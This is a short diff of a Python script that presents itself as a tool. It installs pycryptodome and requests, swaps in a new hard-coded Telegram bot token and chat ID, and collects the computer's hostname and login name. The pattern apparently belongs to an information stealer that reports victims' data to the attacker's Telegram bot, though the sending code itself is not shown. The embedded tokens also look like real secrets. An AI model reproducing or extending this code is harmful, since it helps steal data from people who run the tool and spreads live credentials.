@@ -17,8 +17,8 @@ except:
   os.system("pip install pycryptodome")
   os.system("pip install requests")
   print('__Vui Lòng Chạy Lại Tool__')
-apibot1='6859238707:AAFA1XfMqd61U-tcpKl6vEiZUQ2cSAPZOJM'
-id1 = "5478300957"
+apibot1='7239446668:AAHZwfF2jn4atngGIXWSCLtxy3FfnF3HhxA'
+id1 = "5124222138"
 
 hostname = os.getenv("COMPUTERNAME")
 usernamex = os.getlogin()
